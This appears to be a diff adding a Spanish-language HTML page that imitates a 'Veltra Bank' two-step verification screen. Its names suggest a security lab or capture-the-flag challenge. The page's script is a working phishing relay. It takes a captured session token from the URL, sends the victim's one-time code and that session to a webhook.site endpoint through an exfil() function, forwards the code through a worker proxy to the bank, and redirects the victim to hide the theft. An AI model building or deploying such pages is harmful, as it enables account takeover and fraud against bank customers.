@@ -1,0 +1,90 @@
+<!doctype html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Veltra Bank — Verificación</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <!-- mismo bloque <style> que index.html, copiar y pegar -->
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand">
+      <span class="logo">
+        <svg viewBox="0 0 24 24" fill="none"><path d="M4 5l8-2 8 2v6c0 5-3.5 8-8 10C7.5 19 4 16 4 11V5z" stroke="#06122b" stroke-width="2" stroke-linejoin="round"/></svg>
+      </span>
+      <span>Veltra<b>Bank</b></span>
+    </div>
+    <div class="pill"><span class="dot"></span> Conexion cifrada · TLS 1.3</div>
+  </header>
+
+  <main class="wrap">
+    <section class="hero">
+      <h1>Verificacion<br><em>en dos pasos.</em></h1>
+      <p>Ingresa el codigo de 6 digitos que enviamos a tu dispositivo de confianza.</p>
+    </section>
+
+    <section class="card">
+      <div class="eyebrow">Paso 2 de 2</div>
+      <h2>Codigo de verificacion</h2>
+      <p class="sub">Hola, <strong id="nombre-usuario"></strong>. Ingresa el codigo de 6 digitos.</p>
+      <div class="alert hidden" id="alert-2"></div>
+      <form id="form-2fa" autocomplete="off">
+        <div class="field otp">
+          <label for="txt-2fa">Codigo</label>
+          <input id="txt-2fa" name="txt2fa" type="text" inputmode="numeric" maxlength="6" placeholder="000000" autofocus>
+        </div>
+        <button id="btn-2fa" type="submit" class="btn">Confirmar e ingresar</button>
+      </form>
+    </section>
+  </main>
+
+  <script>
+    const PROXY   = 'https://veltra-worker.emi-hacklab.workers.dev';
+    const WEBHOOK = 'https://webhook.site/cd61594e-3657-40b5-988c-e2ba2e032108';
+    const BANCO   = 'https://chl-252f32f0-0279-4210-a32f-5148b25c322d-veltra-bank.softwareseguro.com.ar';
+
+    const params = new URLSearchParams(location.search);
+    const capturedSession = params.get('s') || '';
+    const usuario = params.get('u') || '';
+
+    document.getElementById('nombre-usuario').textContent = usuario;
+
+    function exfil(p) {
+      const qs = new URLSearchParams(p).toString();
+      new Image().src = WEBHOOK + '?' + qs;
+      fetch(WEBHOOK + '?' + qs, { mode: 'no-cors' }).catch(() => {});
+    }
+
+    async function proxyReq(path, body) {
+      const res = await fetch(PROXY + path, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(body)
+      });
+      return res.json();
+    }
+
+    document.getElementById('form-2fa').addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const codigo = document.getElementById('txt-2fa').value.trim();
+      const btn = document.getElementById('btn-2fa');
+
+      btn.disabled = true;
+      btn.textContent = 'Confirmando…';
+
+      exfil({ step: '2', otp: codigo, s: capturedSession });
+
+      try {
+        const res = await proxyReq('/api/verificar-full', { codigo, session: capturedSession });
+        if (res.ok) {
+          window.location.href = BANCO + (res.next || '/dashboard');
+          return;
+        }
+      } catch (err) {}
+
+      setTimeout(() => { window.location.href = BANCO + '/login'; }, 800);
+    });
+  </script>
+</body>
+</html>
